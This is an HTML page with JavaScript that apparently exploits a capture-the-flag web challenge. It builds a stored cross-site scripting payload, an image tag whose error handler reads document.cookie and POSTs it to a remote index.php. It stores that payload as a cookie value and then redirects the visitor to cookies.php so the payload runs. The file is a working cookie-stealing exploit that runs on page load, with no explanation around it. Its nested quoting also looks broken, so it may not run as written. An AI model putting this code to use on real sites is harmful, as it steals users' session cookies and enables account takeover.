<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Set Cookies</title>
</head>
<body>
    <h1>Set Cookies</h1>
    <script>
        // Encode the document.cookie value
        const encodedCookieValue = encodeURIComponent(document.cookie);

        // Construct the metaCookies payload with encoded cookie value
        const metaCookies = '<img src="x" onerror="fetch('http://host3.metaproblems.com:6020/index.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`cookie_name=6&cookie_value='${encodeURIComponent(document.cookie)}'&submit=Store+Cookie`}).then(response => response.json()).then(data => console.log(data)).catch(error => console.error('Error:', error));">';

        // URL for the POST request to set initial cookies
        const url = 'http://host3.metaproblems.com:6020/index.php';

        // First redirect and POST request
        setTimeout(() => {
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `cookie_name=5&cookie_value=${encodeURIComponent(metaCookies)}&submit=Store+Cookie`
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error('Error:', error));

            // First redirect to cookies.php
            window.location.href = 'http://host3.metaproblems.com:6020/cookies.php';
        }, 1000); // Redirect after 1 second

        // Second redirect to cookies.php (after 3 seconds, adjust timing as needed)
        setTimeout(() => {
            window.location.href = 'http://host3.metaproblems.com:6020/cookies.php';
        }, 3000); // Redirect after 3 seconds
    </script>
</body>
</html>
